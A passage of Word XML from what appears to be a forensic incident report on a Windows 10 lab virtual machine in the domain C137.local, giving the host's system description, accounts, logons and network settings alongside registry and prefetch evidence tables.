        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.prefetch_timeline</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"RunTime": "2020-09-19 05:08:37.5328773", "ExecutableName": "\\VOLUME{01d68d85e0da1e22-b0e0e8ff}\\WINDOWS\\SYSTEM32\\CMD.EXE"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0_Timeline.csv#55</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.prefetch_timeline</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"RunTime": "2020-09-19 05:08:37.6563942", "ExecutableName": "\\VOLUME{01d68d85e0da1e22-b0e0e8ff}\\WINDOWS\\SYSTEM32\\WINDOWSPOWERSHELL\\V1.0\\POWERSHELL.EXE"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0_Timeline.csv#308</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-001: System description: DESKTOP-SDN1RPT (Windows 10 Enterprise Evaluation 19041), member of domain C137.local</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artifact:network history</w:t>
              <w:br/>
              <w:t>artifact:registry (recmd kroll)</w:t>
              <w:br/>
              <w:t>artifact:registry: accounts (sam)</w:t>
              <w:br/>
              <w:t>artifact:registry: known networks</w:t>
              <w:br/>
              <w:t>artifact:registry: profilelist</w:t>
              <w:br/>
              <w:t>evtx:security.evtx</w:t>
              <w:br/>
              <w:t>evtx:system.evtx</w:t>
              <w:br/>
              <w:t>memory</w:t>
              <w:br/>
              <w:t>network</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2020-09-18 05:41:33.459149 → 2020-09-19 03:52:13.567580</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Host: ComputerName DESKTOP-SDN1RPT (SYSTEM hive ControlSet001\Control\ComputerName). Setup-time name WIN-2IH1TBB9I4Q (System 6005 at 2020-09-18 05:41:33, 1074 at 05:46:01 "Operating System: Upgrade (Planned)"). OS: Windows 10 Enterprise Evaluation, EditionID EnterpriseEval, CurrentBuild 19041 (20H1/2004); Volatility windows.info: NtMajorVersion 10, build 15.19041, x64, 2 CPUs. RegisteredOwner "Admin". InstallDate 2020-09-18 05:47:03 UTC. Time zone: Pacific Standard Time, Bias 480, ActiveTimeBias 420 (UTC-7, PDT) — all times here in UTC.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Domain: C137.local. The EVTX Computer field changes from "DESKTOP-SDN1RPT" to "DESKTOP-SDN1RPT.C137.local" after the reboot at 2020-09-18 21:42:27 (1074 by SystemSettingsAdminFlows.exe = domain join restart; 6005 at 21:42:39 Computer DESKTOP-SDN1RPT.C137.local). NetworkList profile "C137.local" (Managed=True, domain-authenticated) FirstConnect 2020-09-18 14:42:45 local (21:42:45 UTC), last connected 2020-09-18 20:13:21 local (2020-09-19 03:13:21 UTC); earlier profile "Network" first 2020-09-17 21:58:02 local. Gateway MAC 00-0C-29-95-CD-21 (VMware OUI).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Network: Intel 82574L Gigabit NIC (VMware e1000e), static IP 10.42.85.115 (EnableDHCP=0), DNS server 10.42.85.10 (also the source of a domain Administrator RDP logon, likely the domain controller). VMware Tools present (vmtoolsd.exe) — virtual machine.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Local SAM accounts: Administrator (500, disabled), Guest (501, disabled), DefaultAccount (503), WDAGUtilityAccount (504), Admin (RID 1001, created 2020-09-18 05:49:07, member of Administrators, 6 logons, last login 2020-09-19 03:15:57). Local defaultuser0 (RID 1000) deleted at 2020-09-18 21:40:37 (Security 4726, OOBE cleanup).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Profiles (ProfileList): C:\Users\Admin (S-1-5-21-41211245-796119838-3940169921-1001); domain accounts C:\Users\ricksanchez (S-1-5-21-2232410529-1445159330-2725690660-1106, last logon 2020-09-19 05:08:15), C:\Users\mortysmith (…-1108, logon 2020-09-18 22:59:58, logoff 23:10:07), C:\Users\Administrator (domain RID 500, …-500, profile last write 2020-09-19 03:52:13).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Interactive logons (4624): Admin type 2 (2020-09-18 21:40:23 → 2020-09-19 03:15:57), C137\ricksanchez type 2 (from 2020-09-18 22:44:11), C137\mortysmith type 2 (22:46:39–22:59:58), C137\Administrator type 3 then type 10 (RDP) from 10.42.85.10 at 2020-09-19 03:36:22/03:36:24, C137\ricksanchez type 11/7 (cached/unlock) at 2020-09-19 05:08:15.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Boots (System 12): 2020-09-18 05:41:02, 05:46:19, 21:40:16, 21:42:35, 22:59:32; 2020-09-19 01:07:07, 01:24:04 (last boot before acquisition).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Additional evidence sources: memory image DESKTOP-SDN1RPT.mem (2 GiB, SHA256 AC6EE0E8C273103B94D776F54192D2C6ACF8303AABBD6A199254030C69F667C3, SystemTime 2020-09-19 05:10:39 UTC) and network capture case001.pcap (197,583,252 bytes, SHA256 09ABF49EFEA1852E047987D92907704D47F36D75F6C8056E2CAFA6CC027791CB, traffic 2020-09-18 21:58:07 → 2020-09-19 05:38:57 UTC).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Freshly installed (2020-09-18) Windows 10 Enterprise Evaluation VMware VM, joined to the lab domain C137.local around 21:42 UTC on 2020-09-18, used by domain users ricksanchez and mortysmith and by the local administrator "Admin". The domain Administrator RDP session from 10.42.85.10 at 2020-09-19 03:36 is noted here as context and will be qualified in the lateral-movement steps. Analysis window of interest: 2020-09-18 21:40 → 2020-09-19 05:10 UTC (UTC-7 local).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Evidence (24)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05:46:38.921356</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\ControlSet001\Control\ComputerName\ComputerName</w:t>
              <w:br/>
              <w:t>System Info | System Info (Current) | ComputerName=DESKTOP-SDN1RPT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#1872</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SYSTEM</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:15:57.313394</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\Microsoft\Windows NT\CurrentVersion</w:t>
              <w:br/>
              <w:t>System Info | System Info (Current) | ProductName=Windows 10 Enterprise Evaluation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#7190</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:15:57.313394</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\Microsoft\Windows NT\CurrentVersion</w:t>
              <w:br/>
              <w:t>System Info | System Info (Current) | InstallDate=2020-09-18 05:47:03.0000000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#7191</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:15:57.313394</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\Microsoft\Windows NT\CurrentVersion</w:t>
              <w:br/>
              <w:t>System Info | System Info (Current) | CurrentBuild=19041</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#7196</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 06:41:02.861987</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\ControlSet001\Control\TimeZoneInformation</w:t>
              <w:br/>
              <w:t>System Info | System Time Zone Information | TimeZoneKeyName=Pacific Standard Time | Pacific Standard Time</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#1858</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SYSTEM</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 06:41:02.861987</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\ControlSet001\Control\TimeZoneInformation</w:t>
              <w:br/>
              <w:t>System Info | System Time Zone Information | ActiveTimeBias=420 | 420</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#1859</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SYSTEM</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 21:40:22.975260</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\ControlSet001\Services\Tcpip\Parameters\Interfaces\{d2609205-c6f4-4151-b4e7-e2ac9452bcac}</w:t>
              <w:br/>
              <w:t>System Info | Network Configuration (IPv4) | IPAddress=10.42.85.115</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#1890</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SYSTEM</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 21:40:22.975260</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\ControlSet001\Services\Tcpip\Parameters\Interfaces\{d2609205-c6f4-4151-b4e7-e2ac9452bcac}</w:t>
              <w:br/>
              <w:t>System Info | Network Configuration (IPv4) | NameServer=10.42.85.10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#1896</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SYSTEM</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 21:42:45.755000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: known networks</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network: first connected [local time converted to UTC, ActiveTimeBias=420 min]</w:t>
              <w:br/>
              <w:t>C137.local Wired passerelle=00-0C-29-95-CD-21 DNS=&lt;none&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_KnownNetworks.csv#1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 21:42:45.000755</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network history</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>nethist: created</w:t>
              <w:br/>
              <w:t>profile_name=C137.local | description=C137.local | dns_suffix=&lt;none&gt; | default_gateway_mac=000c2995cd21 | first_network=C137.local</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/network_history.jsonl#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 05:49:07.890379</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: accounts (SAM)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Account created</w:t>
              <w:br/>
              <w:t>Admin RID=1001 logons=6 groups=Administrators</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_UserAccounts.csv#5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:56:15.503156</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: ProfileList</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Profile: last logoff</w:t>
              <w:br/>
              <w:t>C:\Users\ricksanchez</w:t>
              <w:br/>
              <w:t>S-1-5-21-2232410529-1445159330-2725690660-1106</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_ProfileList.csv#4</w:t>
            </w:r>
